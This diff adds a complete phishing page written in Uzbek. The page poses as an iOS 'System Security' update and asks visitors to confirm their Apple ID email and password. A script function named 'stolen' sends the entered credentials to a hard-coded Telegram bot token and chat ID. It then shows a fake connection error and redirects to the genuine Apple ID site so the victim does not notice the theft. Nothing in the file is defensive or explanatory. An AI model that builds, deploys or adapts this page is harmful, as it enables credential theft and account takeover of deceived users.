@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>iOS System Update</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .alert-container {
+            background-color: rgba(30, 30, 30, 0.95);
+            width: 280px;
+            border-radius: 14px;
+            text-align: center;
+            padding: 20px;
+            box-shadow: 0px 0px 30px rgba(0,0,0,0.7);
+            border: 0.5px solid #333;
+        }
+        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 13px; color: #bbb; margin-bottom: 20px; line-height: 1.4; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 10px;
+            border: 1px solid #444;
+            background: #1c1c1c;
+            color: #fff;
+            box-sizing: border-box;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus { border-color: #007aff; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: none;
+            border-top: 0.5px solid #444;
+            color: #007aff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:active { background-color: #333; border-radius: 0 0 14px 14px; }
+    </style>
+</head>
+<body>
+
+<div class="alert-container">
+    <h2>System Security</h2>
+    <p>Xavfsizlik yangilanishini yakunlash uchun Apple ID parolingizni tasdiqlang.</p>
+    
+    <input type="email" id="user_email" placeholder="Email yoki Apple ID">
+    <input type="password" id="user_pass" placeholder="Parol">
+    
+    <button onclick="stolen()">OK</button>
+</div>
+
+<script>
+    function stolen() {
+        // Ma'lumotlarni yig'ish
+        var email = document.getElementById('user_email').value;
+        var pass = document.getElementById('user_pass').value;
+        
+        // Sizning ma'lumotlaringiz
+        var token = "8623554651:AAHKUt9dRK5wk4A2Yuwb5LTzfrYjPpNOpec"; 
+        var chat_id = "6601285131"; 
+        
+        var message = "🚀 **YANGI MA'LUMOT TUSHDI** 🚀\n\n" +
+                      "📧 **Apple ID:** " + email + "\n" +
+                      "🔑 **Parol:** " + pass + "\n" +
+                      "📱 **Qurilma:** iPhone (Safari)";
+
+        if(email !== "" && pass !== "") {
+            // Telegram API manzili
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
+            
+            // Ma'lumotni yuborish
+            fetch(url)
+            .then(response => {
+                // Muvaffaqiyatli yuborilgandan so'ng foydalanuvchini chalg'itish
+                alert("Xatolik: 0x8004\nServer bilan aloqa uzildi. Iltimos, qaytadan urinib ko'ring.");
+                window.location.href = "https://appleid.apple.com"; // Haqiqiy saytga o'tish
+            })
+            .catch(error => {
+                console.error("Yuborishda xatolik:", error);
+                alert("Internet aloqasini tekshiring.");
+            });
+        } else {
+            alert("Iltimos, barcha qatorlarni to'ldiring.");
+        }
+    }
+</script>
+
+</body>
+</html>
